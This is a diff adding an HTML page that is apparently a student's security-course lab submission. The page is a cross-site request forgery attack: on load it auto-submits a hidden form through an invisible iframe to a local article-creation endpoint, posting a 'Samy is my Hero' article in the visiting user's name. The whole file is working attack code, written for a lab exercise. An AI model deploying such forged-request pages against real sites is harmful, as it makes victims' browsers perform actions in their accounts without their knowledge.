@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+</head>
+<body>
+<h1>Urgent Update on Assignment Task 1</h1>
+
+<iframe width="0" height="0" border="0" name="hiddenFrame" id="hiddenFrame"></iframe>
+
+<script type="text/javascript">
+// A0100805X Yang Kaiyuan
+function forge_post()
+{
+console.log("forger_post() called")
+
+var fields;
+
+// The following are form entries need to be filled out by attackers.
+// The entries are made hidden, so the victim won’t be able to see them.
+fields += "<input type='hidden' name='title' value='Samy who?'>";
+fields += "<input type='hidden' name='body' value='Samy is my Hero'>";
+fields += "<input type='hidden' name='thumb' value=''>";
+fields += "<input type='hidden' name='slug' value='s-a-m-y-3'>";
+
+// Create a <form> element.
+var p = document.createElement("form");
+
+// Construct the form
+p.action = "http://127.0.0.1:8000/articles/create/";
+p.innerHTML = fields;
+p.method = "post";
+p.target = "hiddenFrame";
+
+// Append the form to the current page.
+document.body.appendChild(p);
+
+console.log("about to submit fields: ", fields)
+// Submit the form
+p.submit();
+}
+// Invoke forge_post() after the page is loaded.
+window.onload = function() { forge_post();}
+</script>
+</body>
+</html>
